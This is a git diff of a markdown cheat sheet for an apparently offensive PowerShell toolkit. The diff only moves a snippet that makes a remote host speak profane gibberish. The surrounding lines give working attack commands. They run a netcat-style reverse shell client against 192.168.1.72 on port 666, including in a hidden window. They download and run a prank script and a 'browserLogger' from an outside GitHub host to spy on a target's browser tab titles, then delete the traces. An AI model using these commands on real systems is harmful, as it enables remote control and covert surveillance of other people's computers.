@@ -99,6 +99,8 @@ Import-Module -Name .\papacat.ps1 -Force
 papacat -c 192.168.1.72 -ep -p 666 -v
 ```
 
+<br />
+
 #### powershell Client (payload hidden execution)
 ```powershell
 Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papacat.ps1 -Force;papacat -c 192.168.1.72 -ep -p 666 -v";exit
@@ -145,6 +147,14 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-C
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 1 -LoopRange 5 -LoopDelay 20 -AutoDel on -MsgBoxClose 18"
 ```
 
+#### Speak a frase to remote host
+```powershell
+$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U       kkkkkkUU       U  ii          THE END"
+Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 95;$SpeakObect.Rate = -4;$SpeakObect.Speak($SPEAKME)
+```
+
+<br />
+
 #### Spying target webbrowser active tab windows title ( background execution )
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
@@ -163,14 +173,6 @@ Get-Content -Path "Browser.report"|Select-String -Pattern 'Windows Title   :'
 # CleanUp
 Remove-Item BrowserLogger.ps1 -force
 Remove-Item Browser.report -force
-```
-
-<br />
-
-#### Speak a frase to remote host
-```powershell
-$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U       kkkkkkUU       U  ii          THE END"
-Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 95;$SpeakObect.Rate = -4;$SpeakObect.Speak($SPEAKME)
 ```
 
 <br />
